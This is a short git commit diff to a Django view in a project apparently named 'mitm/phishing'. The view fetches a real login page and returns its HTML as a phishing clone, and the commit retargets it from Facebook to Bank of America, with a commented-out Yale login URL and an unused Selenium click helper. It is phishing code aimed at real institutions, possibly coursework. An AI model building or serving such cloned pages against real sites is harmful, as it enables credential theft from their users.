599748a23783a02064466f110fe6be4fec877107
rinakawamura <rina.kawamura@yale.edu>
2021-11-15 21:22:45 -0500

    Change to site

--- mitm/phishing/views.py
+++ mitm/phishing/views.py
@@ -1,7 +1,18 @@
 from django.http import HttpResponse
 import requests
+from selenium import webdriver
+
+# Function to click button (not being used currently)
+def click_button(url):
+    driver = webdriver.Chrome()
+    driver.get(url)
+    button = driver.find_element_by_id("nav-link-accountList")
+    button.click()
+    return driver.current_url
 
 # Phishing site for FB
 def index(request):
-    req = requests.get('https://www.facebook.com/')
+    # url = 'https://secure.its.yale.edu/cas/login?service=https%3A%2F%2Fyale.instructure.com%2Flogin%2Fcas'
+    url = 'https://www.bankofamerica.com/'
+    req = requests.get(url)
     return HttpResponse(req.text)
